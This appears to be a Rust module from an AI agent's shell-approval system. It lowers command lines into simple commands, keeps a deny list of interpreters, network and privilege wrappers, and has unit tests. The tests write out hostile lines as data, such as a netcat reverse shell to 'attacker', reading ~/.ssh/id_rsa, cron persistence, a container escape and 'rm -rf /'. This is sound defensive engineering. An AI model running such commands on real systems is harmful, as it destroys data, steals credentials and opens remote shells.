//! Commands and lowering ([docs/ac-approvals.md] §2).
//!
//! A submission to the shell tool is a command *line* — a single string the
//! host runs as `sh -c "<line>"`. **Lowering** parses it into its constituent
//! simple commands: pipeline and list segments (`|`, `&&`, `||`, `;`) each
//! become their own [`Command`], and a wrapper invocation (`sh -c …`, `env …`)
//! is unwrapped so its inner command is what gets classified — `sh -c "rm -rf ."`
//! is about `rm`, not `sh` (I3), matched by *basename* so `/bin/sh` cannot evade
//! it. Anything the parser cannot confidently model — an unbalanced quote, a
//! redirection, a command substitution, a variable expansion, a `~` home
//! expansion, a subshell, an `env` carrying assignments/flags — lowers to a
//! single [`Lowered::Unknown`]: the parser never guesses, and the engine treats
//! the unknown as the host's `U` default, never as `safe` (R4/I4).

/// A simple command: a program name and its argument vector (§2).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Command {
    pub program: String,
    pub args: Vec<String>,
}

impl Command {
    pub fn new(
        program: impl Into<String>,
        args: impl IntoIterator<Item = impl Into<String>>,
    ) -> Self {
        Self {
            program: program.into(),
            args: args.into_iter().map(Into::into).collect(),
        }
    }
}

/// The result of lowering a shell submission (§2).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Lowered {
    /// Confidently parsed into one or more simple commands — pipeline/list
    /// segments split out, wrappers unwrapped. The aggregate verdict is the join
    /// over these.
    Commands(Vec<Command>),
    /// Could not be confidently parsed: a construct the lowerer does not model,
    /// or a malformed line. Judged as a single unknown command, never as its
    /// first word (I3), and fail-toward-prompt (I4).
    Unknown,
}

/// Bound on wrapper-unwrap recursion (`sh -c "sh -c \"…\""`). Well past any real
/// invocation; a line that nests deeper is treated as unparseable.
const MAX_DEPTH: usize = 8;

/// POSIX-family shells whose `-c <script>` invocation is unwrapped by re-lowering
/// the script.
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ash", "ksh"];

/// Programs an approval rule cannot safely allow *by name*: their arguments can
/// request arbitrary code execution, arbitrary-path writes, or sandbox escape in
/// ways the role taxonomy cannot distinguish from benign use — a rule keyed on
/// them would allow arbitrary commands (§3). So — except the two the lowerer
/// explicitly unwraps (a POSIX shell's `-c`, and a bare `env`) — an invocation of
/// one lowers to [`Lowered::Unknown`] rather than being classified under its name
/// (I3), and none is rulable as allow. Matched by *basename* ([`is_wrapper_escape`]),
/// so a path or versioned spelling (`/bin/sh`, `python3.11`) cannot evade it.
///
/// This set is a **floor, deliberately non-exhaustive**: it names the clear
/// interpreter/wrapper escapes the RFC's "and kin" (§3) covers, not every
/// dangerous program. The kernel sandbox ([ac-sandbox.md], I5) is the ultimate
/// containment for anything it misses, and recognizing dangerous argv *shapes*
/// within an otherwise-rulable program (`rm -rf /`) stays deferred (RFC §6). A
/// program whose danger lives in one *flag* the host can exclude by full
/// consumption (`curl -o`, `rg --pre`) is deliberately absent — the host writes a
/// precise rule for it.
const WRAPPER_ESCAPES: &[&str] = &[
    // POSIX shells (unwrapped by `-c`, but still escapes for the allow guard).
    "sh",
    "bash",
    "dash",
    "zsh",
    "ash",
    "ksh",
    "busybox",
    // Non-POSIX shells — `-c` (or equivalent) is arbitrary execution.
    "fish",
    "tcsh",
    "csh",
    "mksh",
    "yash",
    "rc",
    "elvish",
    "xonsh",
    "nu",
    "pwsh",
    "powershell",
    // env — unwrapped only when bare (assignments/flags bail).
    "env",
    // Language runtimes with an inline-code flag (versioned spellings too — see
    // INTERPRETER_STEMS).
    "python",
    "python2",
    "python3",
    "perl",
    "ruby",
    "node",
    "deno",
    "bun",
    "php",
    "lua",
    "luajit",
    "Rscript",
    "R",
    "julia",
    "groovy",
    "scala",
    "tclsh",
    "wish",
    "expect",
    "osascript",
    "jshell",
    // Text processors whose "script" is Turing-complete / can write or exec
    // (awk `system()`, sed `w`/`e`).
    "awk",
    "gawk",
    "mawk",
    "nawk",
    "sed",
    // File-tree walkers with `-exec`/`-delete`, build runners with arbitrary
    // recipes, editors and debuggers with eval/`!`/`-ex`.
    "find",
    "make",
    "gmake",
    "cmake",
    "vi",
    "vim",
    "nvim",
    "emacs",
    "ed",
    "ex",
    "gdb",
    "lldb",
    // Container / namespace / scheduling — execute or persist outside the sandbox.
    "docker",
    "podman",
    "kubectl",
    "nsenter",
    "unshare",
    "crontab",
    "at",
    "batch",
    "systemd-run",
    // Argument-forwarding / privilege wrappers.
    "xargs",
    "sudo",
    "doas",
    "su",
    "pkexec",
    "runuser",
    "gosu",
    "setpriv",
    "nohup",
    "nice",
    "timeout",
    "watch",
    "stdbuf",
    "setsid",
    "chroot",
    "script",
    "time",
    "command",
    "exec",
    "eval",
    // Remote / transfer tools with command-exec flags (`ssh host cmd`, `rsync -e`,
    // `nc -e`).
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "socat",
    "nc",
    "ncat",
    "telnet",
];

/// Language-runtime stems whose *versioned* spellings are also escapes:
/// `python3`, `python3.11`, `python3.11m`, `ruby2.7`, `node18` all match here —
/// the stem, optionally followed by a version (a digit and anything after).
const INTERPRETER_STEMS: &[&str] = &[
    "python", "perl", "ruby", "node", "php", "lua", "deno", "bun",
];

/// The final path component of a program name — `/usr/bin/rm` → `rm`, `rm` → `rm`.
/// Classification is about *which program*, and a path spelling names the same
/// one; matching by basename is what stops `/bin/sh` from evading the shell/escape
/// checks (I3).
fn basename(program: &str) -> &str {
    program.rsplit('/').next().unwrap_or(program)
}

/// True iff `base` is an interpreter stem or a versioned spelling of one — the
/// stem exactly, or the stem immediately followed by a digit (`python3.11m`,
/// `node18`). A non-version suffix (`pythonfoo`) does not match.
fn is_interpreter(base: &str) -> bool {
    INTERPRETER_STEMS.iter().any(|stem| {
        base == *stem
            || (base.starts_with(stem)
                && base[stem.len()..]
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_digit()))
    })
}

/// True iff `program` names an interpreter or wrapper escape (§3), by basename so
/// a path or versioned spelling cannot slip past. Public because it is the guard
/// the generalization mechanism ([`crate::allow_rule_for_prefix`]) consults.
pub fn is_wrapper_escape(program: &str) -> bool {
    let base = basename(program);
    WRAPPER_ESCAPES.contains(&base) || is_interpreter(base)
}

fn is_shell(program: &str) -> bool {
    SHELLS.contains(&basename(program))
}

/// Lower a shell command line into simple commands (§2). See the module docs.
pub fn lower(line: &str) -> Lowered {
    lower_at(line, 0)
}

fn lower_at(line: &str, depth: usize) -> Lowered {
    if depth > MAX_DEPTH {
        return Lowered::Unknown;
    }
    let Some(tokens) = tokenize(line) else {
        return Lowered::Unknown;
    };
    let Some(segments) = split_segments(tokens) else {
        return Lowered::Unknown;
    };
    let mut commands = Vec::new();
    for words in segments {
        match unwrap(words, depth) {
            Some(mut cmds) => commands.append(&mut cmds),
            None => return Lowered::Unknown,
        }
    }
    if commands.is_empty() {
        // A line of only separators (`;;`, whitespace) with no command.
        return Lowered::Unknown;
    }
    Lowered::Commands(commands)
}

/// A lexer token: a word, or a control operator that separates commands.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Tok {
    Word(String),
    /// `|`, `&&`, `||`, `;` — segment separators. All are treated identically
    /// for lowering (each starts a new simple command); the join makes their
    /// distinction immaterial to the verdict.
    Sep,
}

/// Tokenize a shell line into words and separators. Returns `None` — the signal
/// to lower to [`Lowered::Unknown`] — on any construct the classifier must not
/// silently accept: an unbalanced or unterminated quote, a trailing backslash, a
/// redirection, a subshell/group, a variable expansion, or a command
/// substitution. Quoting (`'…'`, `"…"`, `\x`) is honored so a separator or `$`
/// *inside* quotes is ordinary text.
fn tokenize(line: &str) -> Option<Vec<Tok>> {
    let mut tokens = Vec::new();
    let mut word = String::new();
    let mut has_word = false;
    let mut chars = line.chars().peekable();

    macro_rules! flush {
        () => {
            if has_word {
                tokens.push(Tok::Word(std::mem::take(&mut word)));
                has_word = false;
            }
        };
    }

    while let Some(c) = chars.next() {
        match c {
            // Word-splitting whitespace. A newline also separates commands.
            ' ' | '\t' | '\r' => flush!(),
            '\n' => {
                flush!();
                tokens.push(Tok::Sep);
            }
            '\'' => {
                // Single quotes: everything literal until the next `'`.
                has_word = true;
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(ch) => word.push(ch),
                        None => return None, // unterminated
                    }
                }
            }
            '"' => {
                // Double quotes: `\` escapes `" \ $ ` and newline; an unescaped
                // `$` or backtick is expansion — unmodeled, so bail.
                has_word = true;
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some('\\') => match chars.next() {
                            Some('\n') => {} // line continuation
                            Some(esc @ ('"' | '\\' | '$' | '`')) => word.push(esc),
                            Some(other) => {
                                // POSIX keeps the backslash before any other char.
                                word.push('\\');
                                word.push(other);
                            }
                            None => return None,
                        },
                        Some('$') | Some('`') => return None, // expansion inside ""
                        Some(ch) => word.push(ch),
                        None => return None, // unterminated
                    }
                }
            }
            '\\' => match chars.next() {
                Some('\n') => {} // line continuation
                Some(ch) => {
                    has_word = true;
                    word.push(ch);
                }
                None => return None, // trailing backslash
            },
            // Expansion and command substitution — unmodeled.
            '$' | '`' => return None,
            // A word-initial unquoted `~` is home-directory expansion: the shell
            // rewrites it to `$HOME`, which lands OUTSIDE the workspace region, so
            // a role check on the literal token would falsely pass. Bail (I4). A
            // `~` mid-word (`a~b`) or quoted (`'~/x'`) is a literal — `has_word`
            // being set means we are not at a word start.
            '~' if !has_word => return None,
            // Redirections — a write/read to a path the roles do not type.
            '<' | '>' => return None,
            // Subshell / grouping / brace expansion — unmodeled.
            '(' | ')' | '{' | '}' => return None,
            '|' => {
                flush!();
                if chars.peek() == Some(&'|') {
                    chars.next();
                }
                tokens.push(Tok::Sep);
            }
            '&' => {
                flush!();
                if chars.peek() == Some(&'&') {
                    chars.next();
                    tokens.push(Tok::Sep);
                } else {
                    // A lone `&` backgrounds — a separator, harmless to lowering.
                    tokens.push(Tok::Sep);
                }
            }
            ';' => {
                flush!();
                if chars.peek() == Some(&';') {
                    return None; // `;;` (case terminator) — unmodeled
                }
                tokens.push(Tok::Sep);
            }
            other => {
                has_word = true;
                word.push(other);
            }
        }
    }
    // Final flush, inlined so the macro's `has_word = false` reset is always read
    // by a subsequent iteration (else the last reset warns as a dead assignment).
    if has_word {
        tokens.push(Tok::Word(word));
    }
    Some(tokens)
}

/// Split a token stream on separators into non-empty word groups (simple
/// commands, pre-unwrap). A trailing separator (from `cmd;` / `cmd &`) is
/// tolerated; any *interior* empty group (`a || || b`, a leading separator)
/// means a malformed line — `None`, so the whole lowers to unknown.
fn split_segments(tokens: Vec<Tok>) -> Option<Vec<Vec<String>>> {
    let mut segments = Vec::new();
    let mut current: Vec<String> = Vec::new();

    for tok in tokens {
        match tok {
            Tok::Word(w) => current.push(w),
            Tok::Sep => {
                // A separator with no command before it is malformed — a leading
                // separator, or two in a row. A trailing separator is fine: it
                // leaves `current` empty at end-of-input, which we simply drop.
                if current.is_empty() {
                    return None;
                }
                segments.push(std::mem::take(&mut current));
            }
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    if segments.is_empty() {
        return None;
    }
    Some(segments)
}

/// Turn one pre-unwrap word group into simple commands, unwrapping a shell
/// `-c <script>` (re-lower the script) or a bare `env` prefix. The program is
/// matched by *basename*, so a path spelling (`/bin/sh`, `/usr/bin/env`) unwraps
/// or bails the same as its bare name (I3), and the stored [`Command::program`]
/// is the basename so a rule keyed on `rm` also governs `/bin/rm`. Returns
/// `None` — bail to unknown — for a wrapper escape the lowerer does not model, so
/// no such invocation is ever classified under the wrapper's name (I3).
fn unwrap(words: Vec<String>, depth: usize) -> Option<Vec<Command>> {
    debug_assert!(
        !words.is_empty(),
        "split_segments yields only non-empty groups"
    );
    // Wrapper unwrap recurses (`sh -c`, chained `env`); bound it so a pathological
    // line cannot overflow the stack during pre-flight classification.
    if depth > MAX_DEPTH {
        return None;
    }
    let program = basename(&words[0]);

    if is_shell(program) {
        // Unwrap only the exact `-c <script>` shape; any other shell invocation
        // (`sh script.sh`, `sh -lc …`, bare `sh`) is not confidently classifiable.
        return match words.get(1).map(String::as_str) {
            Some("-c") => match words.get(2) {
                Some(script) => match lower_at(script, depth + 1) {
                    Lowered::Commands(cmds) => Some(cmds),
                    Lowered::Unknown => None,
                },
                None => None, // `sh -c` with no script
            },
            _ => None,
        };
    }

    if program == "env" {
        return unwrap_env(&words[1..], depth);
    }

    if is_wrapper_escape(program) {
        // A wrapper we do not unwrap (`python -c`, `xargs`, `sudo`, …): bail
        // rather than classify under its name.
        return None;
    }

    Some(vec![Command {
        program: program.to_string(),
        args: words[1..].to_vec(),
    }])
}

/// Unwrap a bare `env <cmd> <args>` (the shebang-style use). Any `env`
/// **assignment** (`PATH=.`, `LD_PRELOAD=…`) or **flag** (`-i`, `-u`, `-S`, `-C`)
/// changes which binary runs or the environment it runs in — exactly the
/// uncertainty the classifier must escalate rather than silently strip (R4) — so
/// it bails to unknown. Only assignment-free, flag-free `env cmd` unwraps.
fn unwrap_env(rest: &[String], depth: usize) -> Option<Vec<Command>> {
    // A leading `-` is a flag; a `NAME=VALUE` is an assignment. Either bails.
    match rest.first() {
        None => None, // bare `env` prints the environment
        Some(arg) if arg.starts_with('-') || is_assignment(arg) => None,
        Some(_) => unwrap(rest.to_vec(), depth + 1),
    }
}

/// A `NAME=VALUE` assignment token: a POSIX name (`[A-Za-z_][A-Za-z0-9_]*`)
/// followed by `=`.
fn is_assignment(arg: &str) -> bool {
    let Some(eq) = arg.find('=') else {
        return false;
    };
    let name = &arg[..eq];
    if name.is_empty() {
        return false;
    }
    let mut chars = name.chars();
    let first = chars.next().unwrap();
    (first.is_ascii_alphabetic() || first == '_')
        && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmds(line: &str) -> Vec<Command> {
        match lower(line) {
            Lowered::Commands(c) => c,
            Lowered::Unknown => panic!("expected commands, got unknown for {line:?}"),
        }
    }

    fn is_unknown(line: &str) -> bool {
        lower(line) == Lowered::Unknown
    }

    #[test]
    fn a_simple_command_lowers_to_itself() {
        assert_eq!(
            cmds("ls -la /tmp"),
            vec![Command::new("ls", ["-la", "/tmp"])]
        );
    }

    #[test]
    fn quotes_group_tokens_and_hide_separators() {
        assert_eq!(
            cmds("echo 'a | b' \"c;d\""),
            vec![Command::new("echo", ["a | b", "c;d"])]
        );
    }

    #[test]
    fn a_pipeline_splits_into_segments() {
        assert_eq!(
            cmds("cat f | grep x | wc -l"),
            vec![
                Command::new("cat", ["f"]),
                Command::new("grep", ["x"]),
                Command::new("wc", ["-l"]),
            ]
        );
    }

    #[test]
    fn a_list_splits_on_and_or_and_semicolons() {
        assert_eq!(
            cmds("mkdir d && cd d; ls || echo no"),
            vec![
                Command::new("mkdir", ["d"]),
                Command::new("cd", ["d"]),
                Command::new("ls", Vec::<String>::new()),
                Command::new("echo", ["no"]),
            ]
        );
    }

    #[test]
    fn a_trailing_separator_is_tolerated() {
        assert_eq!(cmds("ls;"), vec![Command::new("ls", Vec::<String>::new())]);
        assert_eq!(cmds("ls &"), vec![Command::new("ls", Vec::<String>::new())]);
    }

    #[test]
    fn a_shell_wrapper_is_unwrapped_to_its_inner_command() {
        // The whole point of I3: this is about `rm`, not `sh`.
        assert_eq!(
            cmds("sh -c 'rm -rf .'"),
            vec![Command::new("rm", ["-rf", "."])]
        );
        assert_eq!(
            cmds("bash -c \"cat a | grep b\""),
            vec![Command::new("cat", ["a"]), Command::new("grep", ["b"])]
        );
    }

    #[test]
    fn bare_env_unwraps_but_assignments_and_flags_bail() {
        // A bare `env cmd` (shebang-style) unwraps to the inner command.
        assert_eq!(cmds("env ls -la"), vec![Command::new("ls", ["-la"])]);
        assert_eq!(cmds("env sh -c 'ls /'"), vec![Command::new("ls", ["/"])]);
        // An assignment can change WHICH binary runs (`PATH=.`) or inject code
        // (`LD_PRELOAD=`), so `env NAME=val cmd` must NOT be silently stripped to
        // a trusted `cmd` — it bails (R4).
        assert!(is_unknown("env PATH=. git status"));
        assert!(is_unknown("env LD_PRELOAD=/x.so cat file"));
        assert!(is_unknown("env FOO=bar ls"));
        // An env flag (`-i`, `-S`, `-u`) is likewise unmodeled.
        assert!(is_unknown("env -i sh -c 'x'"));
        assert!(is_unknown("env -S 'ls -l'"));
    }

    #[test]
    fn a_path_or_versioned_wrapper_spelling_cannot_evade_i3() {
        // A path spelling of a shell still unwraps to its inner command…
        assert_eq!(
            cmds("/bin/sh -c 'rm -rf .'"),
            vec![Command::new("rm", ["-rf", "."])]
        );
        // …a path spelling of a normal program is stored by basename, so a rule
        // keyed on `rm` also governs `/bin/rm`.
        assert_eq!(
            cmds("/usr/bin/rm -rf x"),
            vec![Command::new("rm", ["-rf", "x"])]
        );
        assert_eq!(
            cmds("/usr/bin/env ls"),
            vec![Command::new("ls", Vec::<String>::new())]
        );
        // …a versioned interpreter still bails as an escape (never classified as
        // `python3.11`).
        assert!(is_unknown("python3.11 -c 'import os'"));
        assert!(is_unknown("/opt/bin/ruby2.7 -e 'x'"));
        assert!(is_unknown("busybox sh -c 'rm -rf /'"));
    }

    #[test]
    fn code_capable_programs_are_escapes_and_lower_to_unknown() {
        // The role taxonomy cannot tell a benign invocation of these from a
        // malicious one (the danger is in a script/predicate/flag it can't type),
        // so each must bail rather than be classifiable-as-safe under its name.
        for line in [
            "awk 'BEGIN{system(\"rm -rf /\")}' data.txt", // system()
            "gawk '{print}' f",
            "sed 'w /etc/cron.d/evil' data.txt", // sed `w` writes an absolute path
            "find . -delete",                    // -delete
            "find . -type f -exec rm {} ;",      // -exec (brace bails anyway, but so does find)
            "make",                              // arbitrary recipe, even zero-arg
            "make install",
            "cmake -P evil.cmake",
            "fish -c 'rm -rf /'",                   // non-POSIX shell
            "tcsh -c 'rm -rf /'",                   // non-POSIX shell
            "vim -c '!rm -rf /'",                   // editor `!`
            "gdb -ex 'shell rm -rf /' -batch",      // debugger
            "docker run --rm -v /:/host alpine sh", // container escape
            "crontab evil",                         // persistence
            "nc -e /bin/sh attacker 4444",          // reverse shell
            "tclsh script.tcl",
            "julia -e 'run(`rm`)'",
        ] {
            assert!(is_unknown(line), "expected {line:?} to bail to Unknown");
        }
    }

    #[test]
    fn a_word_initial_tilde_bails_but_quoted_or_mid_word_is_literal() {
        // Home expansion lands outside the workspace region — bail (I4).
        assert!(is_unknown("cat ~/.ssh/id_rsa"));
        assert!(is_unknown("cp secret ~/exfil"));
        assert!(is_unknown("ls ~root"));
        // Quoted or mid-word `~` is a literal, not an expansion.
        assert_eq!(cmds("echo '~/x'"), vec![Command::new("echo", ["~/x"])]);
        assert_eq!(cmds("touch a~b"), vec![Command::new("touch", ["a~b"])]);
    }

    #[test]
    fn chained_env_is_depth_bounded_not_a_stack_overflow() {
        let mut line = String::from("cat file");
        for _ in 0..40 {
            line = format!("env {line}");
        }
        // Deep enough to exceed MAX_DEPTH; must bail, not recurse to overflow.
        assert!(is_unknown(&line));
    }

    #[test]
    fn unmodeled_constructs_lower_to_unknown() {
        assert!(is_unknown("echo $(whoami)")); // command substitution
        assert!(is_unknown("echo `id`")); // backtick substitution
        assert!(is_unknown("rm -rf $DIR")); // variable expansion
        assert!(is_unknown("cat < input")); // redirection
        assert!(is_unknown("ls > out.txt")); // redirection
        assert!(is_unknown("(cd d && ls)")); // subshell
        assert!(is_unknown("echo {a,b}")); // brace expansion
        assert!(is_unknown("echo \"unterminated")); // unbalanced quote
        assert!(is_unknown("echo trailing\\")); // trailing backslash
        assert!(is_unknown("case x in ;; esac")); // `;;`
    }

    #[test]
    fn unmodeled_wrappers_lower_to_unknown_never_to_their_name() {
        // Each of these must NOT classify as `python`/`xargs`/`sudo` — I3.
        assert!(is_unknown("python -c 'import os; os.system(\"x\")'"));
        assert!(is_unknown("xargs rm < list"));
        assert!(is_unknown("sudo rm -rf /"));
        assert!(is_unknown("nohup long-task"));
    }

    #[test]
    fn malformed_lists_lower_to_unknown() {
        assert!(is_unknown("| ls")); // leading separator
        assert!(is_unknown("ls && && wc")); // doubled separator
        assert!(is_unknown("&& ls")); // leading `&&`
        assert!(is_unknown(";")); // separators only
        assert!(is_unknown("")); // empty
        assert!(is_unknown("   ")); // whitespace only
    }

    #[test]
    fn deeply_nested_wrappers_bail_rather_than_recurse_forever() {
        let mut line = String::from("ls");
        for _ in 0..12 {
            line = format!("sh -c {}", shell_quote(&line));
        }
        assert!(is_unknown(&line));
    }

    fn shell_quote(s: &str) -> String {
        format!("'{}'", s.replace('\'', "'\\''"))
    }
}
